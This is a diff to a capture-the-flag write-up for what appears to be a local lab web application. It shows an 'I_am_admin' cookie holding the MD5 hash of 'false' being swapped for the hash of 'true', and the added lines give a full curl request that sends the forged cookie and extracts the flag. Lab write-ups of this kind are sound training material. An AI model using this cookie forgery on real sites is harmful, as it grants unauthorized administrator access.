@@ -1,11 +1,17 @@
 If we open local browser storage and look for information, we can see that we have some data:
 I_am_admin:"68934a3e9455fa72420237eb05902327"
 
-If we put it in crackstation, this is what we get:
+Cookie may contain valuable information. If we put it in crackstation, this is what we get:
 68934a3e9455fa72420237eb05902327	md5	false
 
-This md5 hash is storing false "value". We should try to change it to false ! Lets create a md5 hash storing "true"
+This md5 hash is storing false "value". We should try to change it to true ! Lets create a md5 hash storing "true"
 
 b326b5062b2f0e69046810717534cb09 : true
 
-If we change cookie value in our browser and make a request, we get the flag.
+If we change cookie value and make a request, we get the flag.
+
+curl 'http://192.168.56.101/' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: 
+en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.56.101/?page=signin&username=admin&password=test&Login=Login' 
+-H 'Connection: keep-alive' -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' -H 
+'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' | grep Flag
